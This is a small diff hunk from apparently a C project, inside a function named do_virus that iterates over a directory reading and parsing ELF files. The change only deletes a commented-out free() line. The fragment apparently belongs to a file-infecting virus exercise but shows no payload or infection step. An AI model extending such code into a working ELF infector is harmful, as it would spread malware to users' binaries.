@@ -13,7 +13,6 @@ void do_virus(char* dirName, t_woody *woody)
             {
                 if (read_elf_file(woody, ft_strjoin(dirName, ent->d_name)) == ERROR_CODE)
                 {
-                    // free(woody->addr);
                     continue;
                 }
                 if (parse_info(woody) == ERROR_CODE)
